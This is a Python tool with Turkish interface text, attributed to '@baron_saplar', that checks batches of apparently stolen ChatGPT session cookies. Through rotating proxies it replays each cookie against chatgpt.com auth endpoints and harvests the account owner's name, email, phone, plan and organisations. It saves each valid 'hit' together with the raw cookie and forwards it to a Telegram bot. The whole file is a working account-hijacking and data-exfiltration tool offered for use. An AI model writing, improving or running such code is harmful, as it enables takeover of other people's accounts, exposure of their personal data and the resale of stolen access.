import requests
import os
import colorama
import json
import threading
import re
import time
import urllib.parse
from datetime import datetime
from queue import Queue, Empty
from requests.cookies import RequestsCookieJar
import urllib3
urllib3.disable_warnings()

import webbrowser

webbrowser.open("https://t.me/baroshoping")

colorama.init(autoreset=True)
G = colorama.Fore.GREEN
Y = colorama.Fore.YELLOW
C = colorama.Fore.CYAN
R = colorama.Fore.RED
W = colorama.Fore.WHITE
X = colorama.Fore.RESET
B = colorama.Style.BRIGHT
S = colorama.Style.RESET_ALL


TG_TOKEN   = ""
TG_CHAT_ID = ""
PROXIES    = []
PROXY_IDX  = 0
PROXY_LOCK = threading.Lock()
PRINT_LOCK = threading.Lock()

ST = {'total':0,'done':0,'paid':0,'free':0,'bad':0,'start':0.0}
ST_LOCK    = threading.Lock()
DASH_EVERY = 50


PLAN_MAP = {
    'free':       'Free',
    'plus':       'Plus',
    'pro':        'Pro',
    'pro_lite':   'Pro Lite',
    'go':         'Go',
    'team':       'Team',
    'enterprise': 'Enterprise',
    'business':   'Business',
}
PAID_PLANS = {'plus', 'pro', 'pro_lite', 'go', 'team', 'enterprise', 'business'}


def pr(line=''):
    with PRINT_LOCK:
        print(line, flush=True)


def print_dash():
    with ST_LOCK:
        total=ST['total']; done=ST['done']
        paid=ST['paid']; free=ST['free']; bad=ST['bad']
        elapsed=time.time()-ST['start'] if ST['start'] else 0
    spd   = done/elapsed if elapsed>0 else 0
    eta   = int((total-done)/spd) if spd>0 else 0
    eta_s = f"{eta//60}d {eta%60}s" if eta else '--'
    pct   = int(done/total*100) if total else 0
    with PRINT_LOCK:
        print(
            
            f"{G}PAID:{paid}{X} | {Y}FREE:{free}{X} | {R}BAD:{bad}{X} | "
            f"TOPLAM:{done}/{total} ({pct}%)",
            flush=True
        )


def get_proxy():
    global PROXY_IDX
    if not PROXIES: return None
    with PROXY_LOCK:
        p = PROXIES[PROXY_IDX % len(PROXIES)]
        PROXY_IDX += 1
    return {'http':p,'https':p}


def load_proxies(path):
    global PROXIES
    try:
        with open(path,'r',encoding='utf-8') as f:
            lines=[l.strip() for l in f if l.strip() and not l.startswith('#')]
        PROXIES=[('http://'+l if not l.startswith('http') else l) for l in lines]
        return len(PROXIES)
    except: return 0


def send_telegram(text, file_path=None):
    if not TG_TOKEN or not TG_CHAT_ID: return False
    try:
        if file_path and os.path.exists(file_path):
            with open(file_path,'rb') as f:
                r=requests.post(
                    f'https://api.telegram.org/bot{TG_TOKEN}/sendDocument',
                    data={'chat_id':TG_CHAT_ID,'caption':text[:1024],'parse_mode':'HTML'},
                    files={'document':f}, timeout=20
                )
            if r.json().get('ok'): return True
        r=requests.post(
            f'https://api.telegram.org/bot{TG_TOKEN}/sendMessage',
            json={'chat_id':TG_CHAT_ID,'text':text[:4096],'parse_mode':'HTML'},
            timeout=20
        )
        return r.json().get('ok',False)
    except: return False



def parse_cookies(content):
    content = content.strip()
    if content.startswith('['):
        try:
            arr = json.loads(content)
            if isinstance(arr, list):
                ck_gpt = {}
                ck_all = {}
                for c in arr:
                    if not isinstance(c,dict): continue
                    name   = c.get('name','')
                    value  = c.get('value','')
                    domain = c.get('domain','') or ''
                    if not name or value is None: continue
                    ck_all[name] = str(value)
                    if any(d in domain for d in ['chatgpt.com','openai.com']):
                        ck_gpt[name] = str(value)
                return ck_gpt if ck_gpt else ck_all
        except: pass

    ck_gpt = {}
    ck_all = {}
    is_ns  = False
    for line in content.splitlines():
        line = line.strip()
        if not line: continue
        if line.startswith('#HttpOnly_') or line.startswith('#HttpOnly '):
            line = line[1:]
        elif line.startswith('#'): continue
        parts = line.split('\t')
        if len(parts) >= 7:
            is_ns  = True
            domain = parts[0]
            name   = parts[5]
            value  = parts[6]
            if not name: continue
            ck_all[name] = value
            if any(d in domain for d in ['chatgpt.com','openai.com']):
                ck_gpt[name] = value
    if is_ns:
        return ck_gpt if ck_gpt else ck_all

    if '=' in content:
        hck = {}
        for part in content.replace('\n',';').split(';'):
            if '=' in part:
                k,_,vv = part.strip().partition('=')
                k = k.strip()
                if k: hck[k] = vv.strip()
        return hck
    return {}


def make_session(cookies_dict, proxy):
    session = requests.Session()
    jar = RequestsCookieJar()
    for k,val in cookies_dict.items():
        jar.set(k, val, domain='.chatgpt.com', path='/')
        jar.set(k, val, domain='chatgpt.com',  path='/')
        jar.set(k, val, domain='.openai.com',  path='/')
    session.cookies = jar
    if proxy:
        session.proxies.update(proxy)
        session.verify = False
    return session


def fetch_account_full(session, cookies_dict):

    info = {
        'logged_in':  False,
        'user_id':    None,
        'name':       None,
        'email':      None,
        'phone':      None,
        'picture':    None,
        'plan_raw':   None,
        'plan_label': 'Free',
        'is_paid':    False,
        'billing':    None,
        'orgs':       [],
        'responses':  {},
        'errors':     [],
    }

    HDR = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'referer': 'https://chatgpt.com/',
        'origin': 'https://chatgpt.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
    }


    oai_raw = cookies_dict.get('oai-client-auth-info','')
    if oai_raw:
        try:
            oai = json.loads(urllib.parse.unquote(oai_raw))
            u   = oai.get('user',{})
            info['name']    = u.get('name')
            info['phone']   = u.get('phoneNumber')
            info['picture'] = u.get('picture')
        except: pass

 
    access_token = None
    try:
        r1 = session.get(
            'https://chatgpt.com/api/auth/session',
            headers=HDR, timeout=20, allow_redirects=False
        )

        info['responses']['auth_session'] = {
            'status_code': r1.status_code,
            'headers': dict(r1.headers),
            'cookies': dict(r1.cookies.get_dict()),
            'body': r1.text,
            'url': r1.url,
            'elapsed': r1.elapsed.total_seconds(),
        }

        if r1.status_code in (301,302,303,307,308,401,403):
            info['errors'].append(f"auth_session: HTTP {r1.status_code}")
            return info
        if r1.status_code == 200:
            try:
                d1 = r1.json()
                if not d1 or d1.get('error'):
                    info['errors'].append(f"auth_session: Empty or error response")
                    return info
                info['logged_in'] = True
                access_token      = d1.get('accessToken')
                u = d1.get('user') or {}
                info['email']     = info['email']   or u.get('email')
                info['name']      = info['name']    or u.get('name')
                info['picture']   = info['picture'] or u.get('image') or u.get('picture')
                info['user_id']   = u.get('id')

                
                account = d1.get('account', {})
                plan_raw = account.get('planType', 'free').lower()
                info['plan_raw']   = plan_raw
                info['plan_label'] = PLAN_MAP.get(plan_raw, plan_raw.title())
                info['is_paid']    = plan_raw in PAID_PLANS

            except Exception as e:
                info['errors'].append(f"auth_session parse error: {str(e)}")
    except Exception as e:
        info['errors'].append(f"auth_session request error: {str(e)}")

    if not info['logged_in']:
        return info

    HDR_AUTH = {**HDR, 'Authorization': f'Bearer {access_token}'} if access_token else HDR

    
    try:
        r2 = session.get(
            'https://chatgpt.com/backend-api/me',
            headers=HDR_AUTH, timeout=15, allow_redirects=False
        )

        info['responses']['backend_me'] = {
            'status_code': r2.status_code,
            'headers': dict(r2.headers),
            'cookies': dict(r2.cookies.get_dict()),
            'body': r2.text,
            'url': r2.url,
            'elapsed': r2.elapsed.total_seconds(),
        }

        if r2.status_code == 200:
            try:
                d2 = r2.json()
                info['email']   = info['email']   or d2.get('email')
                info['name']    = info['name']    or d2.get('name')
                info['picture'] = info['picture'] or d2.get('picture')
                info['phone']   = info['phone']   or d2.get('phone_number')
                info['user_id'] = info['user_id'] or d2.get('id')
                orgs_data = d2.get('orgs',{}).get('data',[]) or []
                info['orgs'] = [o.get('title','') for o in orgs_data if o.get('title')]
            except Exception as e:
                info['errors'].append(f"backend_me parse error: {str(e)}")
        else:
            info['errors'].append(f"backend_me: HTTP {r2.status_code}")
    except Exception as e:
        info['errors'].append(f"backend_me request error: {str(e)}")

    return info


def v(val, fb='bulunamadi'):
    return str(val) if val not in (None,'') else fb



def build_capture_full(info, raw_cookie):
    now   = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    plan  = info.get('plan_label','Free')
    label = f"CHATGPT {plan.upper()} HESAP"
    orgs  = ', '.join(info.get('orgs',[])) or 'bulunamadi'

    responses_section = ""
    for endpoint, resp in info.get('responses',{}).items():
        responses_section += f"\n{'='*60}\n"
        responses_section += f"[RESPONSE] {endpoint.upper()}\n"
        responses_section += f"{'='*60}\n"
        responses_section += f"Status Code: {resp.get('status_code')}\n"
        responses_section += f"URL: {resp.get('url')}\n"
        responses_section += f"Elapsed: {resp.get('elapsed')}s\n"
        responses_section += f"\n[HEADERS]:\n"
        for h_k, h_v in resp.get('headers',{}).items():
            responses_section += f"  {h_k}: {h_v}\n"
        responses_section += f"\n[BODY]:\n"
        try:
            body_json = json.loads(resp.get('body','{}'))
            responses_section += json.dumps(body_json, indent=2, ensure_ascii=False)
        except:
            responses_section += resp.get('body','')
        responses_section += "\n"

    errors_section = ""
    if info.get('errors'):
        errors_section = "\n[ERRORS]:\n" + "\n".join(info['errors']) + "\n"

    return (
        f"[HIT]\n"
        f"{'='*60}\n"
        f"{label}\n"
        f"{'='*60}\n\n"
        f"[HESAP BILGILERI]\n"
        f"Ad       : {v(info.get('name'))}\n"
        f"Email    : {v(info.get('email'))}\n"
        f"Telefon  : {v(info.get('phone'))}\n"
        f"Plan     : {v(plan)}\n"
        f"Odeme    : {'EVET' if info.get('is_paid') else 'HAYIR'}\n"
        f"Billing  : {v(info.get('billing'))}\n"
        f"Org      : {orgs}\n"
        f"User ID  : {v(info.get('user_id'))}\n"
        f"Foto     : {v(info.get('picture'))}\n"
        f"Tarih    : {now}\n"
        f"{'='*60}\n"
        f"[HTTP RESPONSES]"
        f"{responses_section}"
        f"{errors_section}"
        f"{'='*60}\n"
        f"[RAW COOKIE]:\n{raw_cookie}\n"
        f"{'='*60}\n"
        f"author @baron_saplar\n"
    )


def build_capture_simple(info, raw_cookie):
    now   = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    plan  = info.get('plan_label','Free')
    label = f"CHATGPT {plan.upper()} HESAP"
    orgs  = ', '.join(info.get('orgs',[])) or 'bulunamadi'
    return (
        f"[HIT]\n\n{label}\n\n"
        f"Ad       : {v(info.get('name'))}\n"
        f"Email    : {v(info.get('email'))}\n"
        f"Telefon  : {v(info.get('phone'))}\n"
        f"Plan     : {v(plan)}\n"
        f"Odeme    : {'EVET' if info.get('is_paid') else 'HAYIR'}\n"
        f"Billing  : {v(info.get('billing'))}\n"
        f"Org      : {orgs}\n"
        f"User ID  : {v(info.get('user_id'))}\n"
        f"Foto     : {v(info.get('picture'))}\n\n"
        f"Tarih    : {now}\n\n"
        f"cookie: {raw_cookie}\n\n"
        f"author @baron_saplar\n"
    )


def save_hit_full(info, raw_cookie, folder, fname):
    os.makedirs(f'hits/{folder}', exist_ok=True)
    path = f'hits/{folder}/{fname}'
    with open(path,'w',encoding='utf-8') as f:
        f.write(build_capture_full(info, raw_cookie))
    return path


def save_hit_simple(info, raw_cookie, folder, fname):
    os.makedirs(f'hits/{folder}', exist_ok=True)
    path = f'hits/{folder}/{fname}'
    with open(path,'w',encoding='utf-8') as f:
        f.write(build_capture_simple(info, raw_cookie))
    return path


def build_tg(info):
    plan  = info.get('plan_label','Free')
    icon  = '💎' if info.get('is_paid') else '✅'
    label = f"CHATGPT {plan.upper()} HESAP"
    orgs  = ', '.join(info.get('orgs',[])) or 'bulunamadi'
    return (
        f"{icon} <b>{label}</b>\n\n"
        f"👤 <b>Ad</b>      : {v(info.get('name'))}\n"
        f"📧 <b>Email</b>   : {v(info.get('email'))}\n"
        f"📱 <b>Telefon</b> : {v(info.get('phone'))}\n"
        f"💎 <b>Plan</b>    : {v(plan)}\n"
        f"💰 <b>Odeme</b>   : {'EVET' if info.get('is_paid') else 'HAYIR'}\n"
        f"🗓 <b>Billing</b> : {v(info.get('billing'))}\n"
        f"🏢 <b>Org</b>     : {orgs}\n"
        f"🔑 <b>User ID</b> : {v(info.get('user_id'))}\n\n"
        f"<i>author @baron_saplar</i>"
    )


def print_full_response(info):
    pr(f"\n{B}{C}{'='*70}{X}{S}")
    pr(f"{B}{Y}[FULL HTTP RESPONSES]{X}{S}")
    pr(f"{B}{C}{'='*70}{X}{S}\n")

    for endpoint, resp in info.get('responses',{}).items():
        status = resp.get('status_code',0)
        status_color = G if 200 <= status < 300 else (Y if 300 <= status < 400 else R)

        pr(f"{B}{'─'*70}{X}{S}")
        pr(f"{B}{C}>>> ENDPOINT: {endpoint.upper()}{X}{S}")
        pr(f"{B}{'─'*70}{X}{S}")
        pr(f"  {B}URL:{X} {resp.get('url')}")
        pr(f"  {B}Status:{X} {status_color}{status}{X}")
        pr(f"  {B}Elapsed:{X} {resp.get('elapsed')}s")
        pr(f"\n{B}  [RESPONSE HEADERS]:{X}")

        for h_k, h_v in resp.get('headers',{}).items():
            pr(f"    {C}{h_k}:{X} {h_v}")

        pr(f"\n{B}  [RESPONSE BODY]:{X}")
        body = resp.get('body','')
        try:
            body_json = json.loads(body)
            formatted = json.dumps(body_json, indent=2, ensure_ascii=False)
            for line in formatted.split('\n'):
                pr(f"    {line}")
        except:
            for line in body.split('\n')[:50]:
                pr(f"    {line}")
        pr("")

    if info.get('errors'):
        pr(f"\n{B}{R}[ERRORS]:{X}{S}")
        for err in info['errors']:
            pr(f"  {R}❌ {err}{X}")

    pr(f"\n{B}{C}{'='*70}{X}{S}")


def _check_dash_maybe():
    if ST['done'] % DASH_EVERY == 0:
        threading.Thread(target=print_dash, daemon=True).start()


def _worker(q):
    while True:
        try:
            item = q.get(timeout=3)
        except Empty:
            break
        try:
            _process(item)
        except Exception as e:
            cookie_dir, fname = item
            with ST_LOCK:
                ST['bad']  += 1
                ST['done'] += 1
            pr(f'{R}❌ HATA: {fname} — {e}{X}')
        finally:
            q.task_done()


def _process(item):
    cookie_dir, fname = item
    path = os.path.join(cookie_dir, fname)
    try:
        with open(path,'r',encoding='utf-8',errors='ignore') as f:
            content = f.read()
    except:
        with ST_LOCK: ST['bad']+=1; ST['done']+=1
        pr(f'{R}❌ Okuma: {fname}{X}'); return

    cookies = parse_cookies(content)
    if not cookies:
        with ST_LOCK: ST['bad']+=1; ST['done']+=1
        pr(f'{R}❌ Parse: {fname}{X}'); return

    gpt_keys = {
        '__Secure-next-auth.session-token',
        '__Host-next-auth.csrf-token',
        'oai-sc', 'oai-did',
    }
    has_gpt = any(k in cookies for k in gpt_keys)
    if not has_gpt:
        has_gpt = any(
            str(val).startswith('eyJ') and len(str(val)) > 100
            for val in cookies.values()
        )
    if not has_gpt:
        with ST_LOCK: ST['bad']+=1; ST['done']+=1
        pr(f'{R}❌ GPT Yok: {fname}{X}'); return

    proxy   = get_proxy()
    session = make_session(cookies, proxy)
    info    = fetch_account_full(session, cookies)

    ts     = datetime.now().strftime('%Y%m%d_%H%M%S')
    ep     = (info.get('email') or 'unknown').split('@')[0]
    ofname = f"{ts}_{ep}.txt"
    email  = v(info.get('email'))
    plan   = v(info.get('plan_label'))
    phone  = v(info.get('phone'))

    if not info.get('logged_in'):
        with ST_LOCK:
            ST['bad']+=1; ST['done']+=1
            _check_dash_maybe()
        pr(f'{R}❌ Expired: {fname}{X}'); return

    if info.get('is_paid'):
        with ST_LOCK:
            ST['paid']+=1; ST['done']+=1
        pr(f'{G}{B}💎 {plan:<10} | {email:<30} | {phone:<14} | {fname}{X}{S}')
        folder   = plan.lower().replace(' ','_')
        hit_path = save_hit_simple(info, content, folder, ofname)
        if TG_TOKEN: send_telegram(build_tg(info), hit_path)
        print_dash()
    else:
        with ST_LOCK:
            ST['free']+=1; ST['done']+=1
            _check_dash_maybe()
        pr(f'{Y}✅ FREE       | {email:<30} | {phone:<14} | {fname}{X}')
        hit_path = save_hit_simple(info, content, 'free', ofname)
        if TG_TOKEN: send_telegram(build_tg(info), hit_path)


def clear_screen():
    os.system('cls' if os.name=='nt' else 'clear')


def batch_check():
    global ST
    clear_screen()
    pr(f'\n{B}{C}📁 TOPLU KONTROL{X}{S}\n')
    cookie_dir = input('Cookie klasor yolu (bos = ./cookies): ').strip()
    if not cookie_dir: cookie_dir = 'cookies'
    cookie_dir = cookie_dir.rstrip('/\\')

    if not os.path.isdir(cookie_dir):
        pr(f"{R}Klasor bulunamadi: {cookie_dir}{X}")
        input('\nEnter...'); return main()

    files=[f for f in os.listdir(cookie_dir) if os.path.isfile(os.path.join(cookie_dir,f))]
    if not files:
        pr(f"{R}Klasorde dosya yok: {cookie_dir}{X}")
        input('\nEnter...'); return main()

    try:
        n=int(input(f'{len(files)} dosya bulundu\nThread sayisi (1-30): ').strip())
        if not 1<=n<=30: n=5
    except: n=5

    with ST_LOCK:
        ST.update({'total':len(files),'done':0,
                   'paid':0,'free':0,'bad':0,'start':time.time()})

    clear_screen()
    pr(f"{B}{C}[ CHATGPT COOKIE CHECKER - @baron_saplar ]{X}{S}")
    pr(f"{cookie_dir} | {len(files)} dosya | {n} thread | TG: {'ON' if TG_TOKEN else 'OFF'} | Proxy: {len(PROXIES)}")
    pr('-'*55)

    q=Queue()
    for f in files: q.put((cookie_dir, f))
    workers=[threading.Thread(target=_worker,args=(q,),daemon=True) for _ in range(n)]
    for w in workers: w.start()
    q.join()
    for w in workers: w.join(timeout=5)

    elapsed=int(time.time()-ST['start'])
    pr(f"\n{G}{'='*55}")
    pr(f"  TAMAMLANDI - {elapsed//60}d {elapsed%60}s")
    pr(f"  Paid : {ST['paid']}")
    pr(f"  Free : {ST['free']}")
    pr(f"  Bad  : {ST['bad']}")
    pr(f"{'='*55}{X}")

    if TG_TOKEN:
        send_telegram(
            f"<b>Tarama Tamamlandi</b>\n\n"
            f"Paid   : {ST['paid']}\n"
            f"Free   : {ST['free']}\n"
            f"Bad    : {ST['bad']}\n"
            f"Toplam : {ST['total']}\n"
            f"Sure   : {elapsed//60}d {elapsed%60}s\n\n"
            f"<i>author @baron_saplar</i>"
        )
    

def telegram_settings():
    global TG_TOKEN, TG_CHAT_ID
    clear_screen()
    pr(f'\n{B}{C}TELEGRAM{X}{S}\n')
    pr(f'Mevcut: {"AKTIF" if TG_TOKEN else "KAPALI"}\n')
    t=input('Bot Token (bos = iptal): ').strip()
    if not t: input('Iptal. Enter...'); return main()
    c=input('Chat ID: ').strip()
    TG_TOKEN=t; TG_CHAT_ID=c
    ok=send_telegram('<b>ChatGPT Checker baglandi!</b>\n\n<i>author @baron_saplar</i>')
    pr(f'{"OK!" if ok else "Hata!"}')
  
  


def proxy_settings():
    global PROXIES
    clear_screen()
    pr(f'\n{B}{C}PROXY{X}{S}\nMevcut: {len(PROXIES)} proxy\n')
    pr(f'[1] proxies.txt yukle  [2] Manuel  [3] Temizle  [q] Geri')
    ch=input('\nSecim: ').strip()
    if ch=='1':
        path=input('Dosya (proxies.txt): ').strip() or 'proxies.txt'
        n=load_proxies(path)
        pr(f'{str(n)+" yuklendi" if n else "Yuklenemedi"}')
    elif ch=='2':
        PROXIES=[]
        pr('ip:port gir, bos = bitti:')
        while True:
            p=input('  ').strip()
            if not p: break
            if not p.startswith('http'): p='http://'+p
            PROXIES.append(p)
        pr(f'{len(PROXIES)} proxy')
    elif ch=='3':
        PROXIES=[]
    
def main():
    while True:
        clear_screen()
        tg_st=f'{G}ON{X}' if TG_TOKEN else f'{R}OFF{X}'
        px_st=f'{G}{len(PROXIES)} proxy{X}' if PROXIES else f'{Y}YOK{X}'
        print(f"""

          CHATGPT COOKİE CHECKER

    TG: {tg_st}   Proxy: {px_st}

{Y}[1]{X} Check             B
{Y}[2]{X} Telegram             A
{Y}[3]{X} Proxy                    R
{Y}[q]{X} Cikis                       O
                                   N
{'─'*40}""", flush=True)
        ch=input('Secim: ').strip().lower()
        if   ch=='1': batch_check()
        elif ch=='2': telegram_settings()
        elif ch=='3': proxy_settings()
        elif ch in ('q','exit','quit'): pr(f'\n{G}Bye!{X}'); break
        else: input('Gecersiz. Enter...')


if __name__=='__main__':
    for d in ['cookies','hits/plus','hits/pro','hits/pro_lite',
              'hits/go','hits/team','hits/enterprise','hits/business','hits/free']:
        os.makedirs(d, exist_ok=True)
    main()